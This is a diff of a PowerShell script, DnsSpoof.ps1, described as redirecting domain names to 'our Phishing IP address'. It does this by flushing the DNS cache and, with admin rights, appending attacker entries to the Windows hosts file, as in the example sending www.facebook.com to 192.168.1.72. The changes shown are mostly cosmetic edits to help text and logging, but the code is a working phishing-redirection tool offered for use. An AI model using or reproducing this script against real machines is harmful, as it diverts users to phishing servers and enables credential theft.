@@ -1,4 +1,4 @@
-﻿<#
+<#
 .SYNOPSIS
    Redirect Domain Names to our Phishing IP address (dns spoof)
 
@@ -6,28 +6,28 @@
    Tested Under: Windows 10 (18363) x64 bits
    Required Dependencies: none
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.0.1
+   PS cmdlet Dev version: v1.0.2
    
 .DESCRIPTION
+   Remark: This module its [ deprecated ]
    Redirect Domain Names to our Phishing IP address
-   Remark: This module its deprecated
 
 .NOTES
    Required Dependencies: Administrator privileges on shell
-   Remark: This will never work if the server uses CDN or virtual
-   hosts. This only applies on servers with dedicated IPs.
+   Remark: This will never work if the server uses CDN or
+   virtual hosts This only applies on servers with dedicated IPs.
 
 .Parameter DnSpoof
    Accepts Enum, Redirect and Clear @arguments
 
 .Parameter FileHosts
-   Accepts the hosts file absoluct path
+   Accepts the hosts file absoluct path (optional setting)
 
 .Parameter Domain
    Accepts the Domain Name to be redirected to our phishing IP address 
 
 .Parameter ToIPaddr
-   Accepts the Phishing IP Address to redirect Domain name
+   Accepts the Phishing IP Address to redirect Domain name into
 
 .EXAMPLE
    PS C:\> Get-Help .\DnsSpoof.ps1 -full
@@ -52,7 +52,7 @@
    Redirecting Domains Using hosts File (Dns Spoofing)
    Clean dns cache before adding entry to hosts file.
    Redirect Domain: www.facebook.com TO IPADDR: 192.168.1.72
-
+   ---------------------------------------------------------
    # This file contains the mappings of IP addresses to host names. Each
    # entry should be kept on an individual line. The IP address should
    # be placed in the first column followed by the corresponding host name.
@@ -97,8 +97,7 @@ If($DnsSpoof -ieq "Enum"){
    If(Test-Path -Path "$FileHosts"){
        echo "`nDisplay hosts file content (dns resolver)" > $Env:TMP\outputtable.log
        echo "-----------------------------------------" >> $Env:TMP\outputtable.log
-       Start-Sleep -Seconds 1
-       Get-Content -Path "$Env:TMP\outputtable.log"
+       Get-Content -Path "$Env:TMP\outputtable.log";Start-Sleep -Seconds 1
        Remove-Item -Path "$Env:TMP\outputtable.log" -Force
        Get-Content -Path "$FileHosts"
        Write-Host "`n"
@@ -132,7 +131,8 @@ If($DnsSpoof -ieq "Redirect"){
    ## Clean dns cache before adding entry to hosts file
    ipconfig /flushdns|Out-Null
 
-   echo "Redirect Domain: $Domain TO IPADDR: $ToIPaddr`n" >> $Env:TMP\qwerty.log
+   echo "Redirect Domain: $Domain TO IPADDR: $ToIPaddr" >> $Env:TMP\qwerty.log
+   echo "---------------------------------------------------------" >> $Env:TMP\qwerty.log
    ## Make sure we are running under administrator privileges account       
    $bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")
    If($bool){## Administrator privileges found
@@ -147,9 +147,8 @@ If($DnsSpoof -ieq "Redirect"){
        Add-Content -Path $FileHosts "$ToIPaddr $Domain"
 
        ## Build output Table
-       Get-Content -Path "$Env:TMP\qwerty.log"
+       Get-Content -Path "$Env:TMP\qwerty.log";Start-Sleep -Seconds 1
        Remove-Item -Path "$Env:TMP\qwerty.log" -Force
-       Start-Sleep -Seconds 1
        Get-Content -Path "$FileHosts"
        Write-Host "`n"
 
